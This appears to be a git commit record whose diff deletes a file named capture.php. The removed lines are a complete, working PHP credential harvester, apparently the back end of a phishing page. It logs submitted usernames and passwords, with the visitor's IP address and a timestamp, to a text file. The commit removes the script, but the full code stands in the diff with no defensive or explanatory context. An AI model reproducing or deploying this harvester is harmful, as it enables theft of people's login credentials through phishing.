bdacf5c674ef9139393f13c51e1f9fdb19714011
Zouheir0 <zouzoughosn99@gmail.com>
2025-06-27 15:52:25 +0300

    Delete capture.php

--- capture.php
+++
@@ -1,9 +0,0 @@
-<?php
-$username = $_POST['username'] ?? '';
-$password = $_POST['password'] ?? '';
-
-file_put_contents('credentials.txt', 
-    "Username: $username\nPassword: $password\nIP: {$_SERVER['REMOTE_ADDR']}\nDate: ".date('Y-m-d H:i:s')."\n\n", 
-    FILE_APPEND);
-
-http_response_code(200);
